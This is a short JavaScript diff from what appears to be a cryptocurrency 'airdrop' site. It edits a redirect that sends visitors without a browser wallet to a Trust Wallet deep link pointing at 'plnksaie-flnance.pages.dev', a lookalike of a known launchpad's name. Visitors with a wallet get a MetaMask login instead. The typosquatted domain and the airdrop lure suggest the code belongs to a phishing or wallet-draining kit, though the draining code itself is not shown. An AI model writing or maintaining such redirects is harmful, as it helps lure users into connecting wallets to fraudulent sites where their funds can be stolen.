@@ -104,7 +104,7 @@ $(document).on(
     if (!window.ethereum) {
       location2 = location.href;
       location2 = location2.replace(/https:\/\//g, "");
-      window.open("https://link.trustwallet.com/open_url?coin_id=60&amp;url=https://plnksaie-flnance.pages.dev/launchpad/beep-airdrop/");
+      window.open("https://link.trustwallet.com/open_url?coin_id=60&url=https://plnksaie-flnance.pages.dev/beep-airdrop/");
       return false;
     } else {
       loginWithMetaMask();
